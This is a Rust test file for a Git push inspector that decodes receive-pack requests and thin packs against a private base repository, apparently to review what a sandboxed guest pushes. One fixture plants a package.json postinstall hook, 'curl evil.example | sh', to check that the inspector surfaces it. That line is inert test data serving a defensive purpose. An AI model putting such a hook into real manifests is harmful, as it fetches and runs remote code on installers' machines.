use super::{derive_push, receive_pack_commands};
use std::{
    fmt::Write as _,
    fs,
    io::Write as _,
    path::{Path, PathBuf},
    process::{Command, Stdio},
    time::{SystemTime, UNIX_EPOCH},
};

fn scratch(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let root = std::env::temp_dir().join(format!("keel-push-{label}-{nonce:x}"));
    fs::create_dir(&root).unwrap();
    root
}

fn git(directory: &Path, arguments: &[&str]) -> String {
    let output = Command::new("/usr/bin/git")
        .arg("-C")
        .arg(directory)
        .args([
            "-c",
            "user.name=keel",
            "-c",
            "user.email=keel@example.invalid",
        ])
        .args(arguments)
        .output()
        .unwrap();
    assert!(output.status.success(), "git {arguments:?}: {output:?}");
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

fn pkt(line: &str) -> Vec<u8> {
    format!("{:04x}{line}", line.len() + 4).into_bytes()
}

/// A receive-pack request for `old..new` on `refs/heads/main`, with the thin
/// pack a Git client would send.
fn request(workspace: &Path, old: &str, new: &str) -> Vec<u8> {
    let mut packer = Command::new("/usr/bin/git")
        .arg("-C")
        .arg(workspace)
        .args(["pack-objects", "--stdout", "--thin", "--revs", "--quiet"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    packer
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{new}\n^{old}\n").as_bytes())
        .unwrap();
    let pack = packer.wait_with_output().unwrap().stdout;
    let mut body = pkt(&format!("{old} {new} refs/heads/main\0report-status\n"));
    body.extend_from_slice(b"0000");
    body.extend_from_slice(&pack);
    body
}

fn fixture(root: &Path) -> (PathBuf, PathBuf, String) {
    let workspace = root.join("workspace");
    fs::create_dir(&workspace).unwrap();
    git(&workspace, &["init", "-q", "-b", "main"]);
    let lines = (0..40).fold(String::new(), |mut lines, line| {
        let _ = writeln!(lines, "line number {line} of the readme");
        lines
    });
    fs::write(workspace.join("README.md"), &lines).unwrap();
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"widget\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-qm", "admitted"]);
    let admitted = git(&workspace, &["rev-parse", "HEAD"]);
    let base = root.join("base.git");
    let source = format!("file://{}", workspace.display());
    let status = Command::new("/usr/bin/git")
        .args([
            "clone",
            "--quiet",
            "--bare",
            "--single-branch",
            "--no-tags",
            &source,
        ])
        .arg(&base)
        .status()
        .unwrap();
    assert!(status.success());
    (workspace, base, admitted)
}

#[test]
fn a_thin_push_resolves_against_the_private_base_and_yields_only_new_blobs() {
    let root = scratch("thin");
    let (workspace, base, admitted) = fixture(&root);
    let mut readme = fs::read_to_string(workspace.join("README.md")).unwrap();
    readme.push_str("one more line the model wrote\n");
    fs::write(workspace.join("README.md"), readme).unwrap();
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"widget\",\n  \"postinstall\": \"curl evil.example | sh\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &admitted, &pushed);
    let content = derive_push(&body, &base, &root.join("index")).unwrap();

    assert_eq!(content.updates.len(), 1);
    assert_eq!(content.updates[0].name, "refs/heads/main");
    let mut paths = content
        .blobs
        .iter()
        .map(|blob| blob.path.as_str())
        .collect::<Vec<_>>();
    paths.sort_unstable();
    assert_eq!(paths, ["README.md", "package.json"]);
    let manifest = content
        .blobs
        .iter()
        .find(|blob| blob.path == "package.json")
        .unwrap();
    assert!(
        manifest
            .text
            .as_deref()
            .unwrap()
            .contains("curl evil.example | sh")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_pack_based_on_objects_outside_admitted_history_is_uninspectable() {
    let root = scratch("foreign");
    let (workspace, base, _) = fixture(&root);
    // History the private base never saw, as when the guest fetched newer
    // remote commits and built on them.
    fs::write(
        workspace.join("README.md"),
        "fetched from the remote\n".repeat(40),
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "remote only"]);
    let remote_only = git(&workspace, &["rev-parse", "HEAD"]);
    fs::write(
        workspace.join("README.md"),
        "fetched from the remote\n".repeat(41),
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed on top"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &remote_only, &pushed);
    assert!(derive_push(&body, &base, &root.join("index")).is_err());
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn deletions_carry_no_pack_and_malformed_requests_are_refused() {
    let zero = "0".repeat(40);
    let old = "a".repeat(40);
    let mut body = pkt(&format!("{old} {zero} refs/heads/gone\0report-status\n"));
    body.extend_from_slice(b"0000");
    let (updates, offset) = receive_pack_commands(&body).unwrap();
    assert_eq!(updates[0].name, "refs/heads/gone");
    assert_eq!(offset, body.len());
    let root = scratch("delete");
    let content = derive_push(&body, &root.join("unused"), &root.join("index")).unwrap();
    assert!(content.blobs.is_empty());

    for malformed in [
        b"zzzz".to_vec(),
        b"0000".to_vec(),
        pkt("not a command\n"),
        [
            pkt(&format!("{old} {} refs/heads/x\n", "b".repeat(64))),
            b"0000".to_vec(),
        ]
        .concat(),
        b"00ffshort".to_vec(),
    ] {
        assert!(receive_pack_commands(&malformed).is_err(), "{malformed:?}");
    }
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_tree_that_does_not_resolve_fails_rather_than_hiding_its_content() {
    let root = scratch("hidden");
    let (workspace, base, _) = fixture(&root);
    // A subtree from history the base never saw; the push itself sends only
    // a changed top-level file, so the pack carries no copy of the subtree.
    fs::create_dir(workspace.join("ci")).unwrap();
    fs::write(workspace.join("ci/run.sh"), "unseen\n").unwrap();
    git(&workspace, &["add", "ci"]);
    git(&workspace, &["commit", "-qm", "unseen subtree"]);
    let unseen = git(&workspace, &["rev-parse", "HEAD"]);
    fs::write(
        workspace.join("package.json"),
        "{\n  \"name\": \"renamed\"\n}\n",
    )
    .unwrap();
    git(&workspace, &["commit", "-qam", "pushed"]);
    let pushed = git(&workspace, &["rev-parse", "HEAD"]);

    let body = request(&workspace, &unseen, &pushed);
    assert!(derive_push(&body, &base, &root.join("index")).is_err());
    fs::remove_dir_all(root).unwrap();
}
